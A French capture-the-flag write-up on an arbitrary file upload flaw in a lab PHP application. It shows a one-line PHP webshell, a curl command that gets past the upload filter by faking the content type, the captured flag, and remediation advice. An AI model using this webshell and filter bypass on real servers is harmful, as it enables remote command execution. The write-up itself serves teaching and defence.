# Write up Arbitrary File Upload

# Exploration

Nous avons trouvé une fonctionnalité d’upload de fichier durant nos recherches, sur la page **upload.** Un upload de fichier mal sécurisé peut vite avoir un fort impact sur une application web si il est mal implémenté, le cas critique étant une execution de commandes à distance.

Nous avons testé le workflow basique d’upload en essayant d’ajouter une simple image, **fleur.jpg**:

![Capture d’écran 2024-05-01 à 19.20.09.png](images/Capture_decran_2024-05-01_a_19.20.09.png)

Le fichier semble être sauvegardé sur le serveur, sur le chemin **/tmp/fleur.jpg**

# Exploitation

Nous avons ensuite essayé d’upload un [webshell](https://fr.wikipedia.org/wiki/Code_encoquill%C3%A9) PHP, étant donné que l’app est en PHP:

```jsx
~ echo '<?php system($_GET["cmd"])?>' >> webshell.php
```

Malheureusement, il semble qu’il y ait des protections, est nous n’avons pas réussi à upload ce fichier, surement du à son extension:

![Capture d’écran 2024-05-01 à 19.27.29.png](images/Capture_decran_2024-05-01_a_19.27.29.png)

Nous avons aussi essayé de modifier le nom du fichier avec, par exemple, **webshell.jpg.php**, au cas où il y ai un regex mal configuré, attendant **.jpg** dans le nom du fichier, mais cela n’a pas non plus fonctionné.

Nous avons en revanche réussi à upload ce fichier en modifiant le content type de ce fichier avec **image/jpeg**:

```jsx
curl -X POST 'http://192.168.64.36/index.php?page=upload' --form 'MAX_FILE_SIZE=100000' --form 'uploaded=@webshell.php;filename=webshell.php;type=image/jpeg' --form 'Upload=Upload' | grep flag
[... TRUNCATED DATA ...]
The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
[... TRUNCATED DATA ...]
/tmp/webshell.php succesfully uploaded.
```

Et nous avons donc récupéré le flag.

# Remédiation

Un arbitrary file upload réussi peut mener dans le pire cas à une execution de commande sur le serveur à distance.

Voici différentes idées à mettre en place pour pallier à cette vulnérabilité:

- Valider l’extension des fichiers, en implémentant une whitelist des extensions autorisées
- Analyser le MIME type, et implémenter une whitelist en concordance avec les extensions autorisées
- Renommer le fichier télécharger en utilisant un UUID
- Stocker les fichiers sur un serveur dédié, en dehors de l’application web